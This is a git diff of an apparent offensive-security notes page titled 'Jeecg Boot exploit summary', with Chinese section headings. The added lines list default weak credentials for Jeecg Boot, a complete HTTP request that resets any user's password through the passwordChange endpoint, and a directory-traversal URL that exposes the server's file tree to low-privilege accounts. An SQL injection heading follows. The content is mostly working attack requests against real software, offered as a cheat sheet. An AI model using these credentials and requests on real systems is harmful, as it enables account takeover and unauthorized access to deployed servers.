@@ -12,7 +12,38 @@ mindmap: false
 mindmap2: false
 ---
 
-Description: Jeecg Boot exploit summary. By O神糕手
+Description: Jeecg Boot exploit summary. By 1ucky st0r
+
+## 常见弱口令
+
+```txt
+admin/123456
+jeecg/123456
+admin/admin
+test/test
+demo/test
+jeecg/jeecg123456
+guest/guest
+```
+
+## 任意用户密码重置
+
+```txt
+GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive 
+ ``` 
+
+## 目录遍历漏洞
+
+```txt
+/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/
+低权限账号访问直接返回服务器文件目录信息
+```
 
 ## SQL Injection
 
